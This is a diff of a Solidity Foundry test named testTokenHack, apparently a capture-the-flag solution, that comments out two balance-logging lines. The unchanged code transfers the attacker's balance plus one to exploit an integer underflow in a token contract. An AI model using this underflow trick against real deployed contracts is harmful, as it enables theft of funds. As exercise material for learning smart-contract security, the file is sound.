@@ -31,8 +31,8 @@ contract TokenTest is Test {
     }
 
     function testTokenHack() public testWrapper {
-        console2.log("_hacker before:", _token.balanceOf(_hacker));
+        // console2.log("_hacker before:", _token.balanceOf(_hacker));
         _token.transfer(address(this), _token.balanceOf(_hacker) + 1);
-        console2.log("_hacker after:", _token.balanceOf(_hacker));
+        // console2.log("_hacker after:", _token.balanceOf(_hacker));
     }
 }
